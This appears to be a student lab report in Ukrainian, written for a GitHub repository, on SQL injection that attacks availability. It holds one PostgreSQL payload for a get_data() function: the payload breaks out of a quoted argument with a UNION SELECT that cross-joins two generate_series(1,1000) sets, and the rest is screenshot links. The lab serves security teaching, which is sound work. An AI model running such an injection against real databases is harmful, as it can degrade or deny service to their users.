## Створити виклики функції з SQL-ін'єкціями з порушень доступності, приклади яких представлені в теоретичних відомостях.
## Створити знімки екранів з результатами виконання викликів функції та розмітити їх у файлі access_results.md у GitHub-репозиторії.
Програмний код:
SELECT * FROM get_data('1'' UNION (SELECT a1, CAST(a1 AS VARCHAR), CAST(a1 AS INTEGER) FROM (SELECT generate_series a1 FROM generate_series (1,1000)) t1 CROSS JOIN (SELECT * FROM generate_series (1,1000) t2) t3) -- '); 
![image](https://user-images.githubusercontent.com/55044802/208712648-4de42f49-99af-4b47-b04b-07fbdedc707f.png)

![image](https://user-images.githubusercontent.com/55044802/208713477-eb765939-d6f4-4b47-ac88-c1ef0e9d8f1d.png)
